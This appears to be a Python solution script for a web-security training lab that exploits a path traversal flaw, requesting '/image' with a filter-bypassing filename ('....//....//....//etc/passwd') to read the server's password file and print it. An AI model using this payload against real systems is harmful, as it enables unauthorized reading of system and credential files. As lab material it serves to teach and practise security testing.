from ..utils import *
from urllib.parse import urlencode


def solve_lab(session):
    path = "/image"
    params = { "filename": "....//....//....//etc/passwd" }

    print_info(f"Exploiting path traversal vulnerability by visiting \"{path}?{urlencode(params)}\"...")
    resp = session.get_path(path, params=params)

    if resp.status_code != 200:
        print_fail("Unable to get contents of file.")
    else:
        print_success("GET request came back with the following response:")
        print(resp.text)

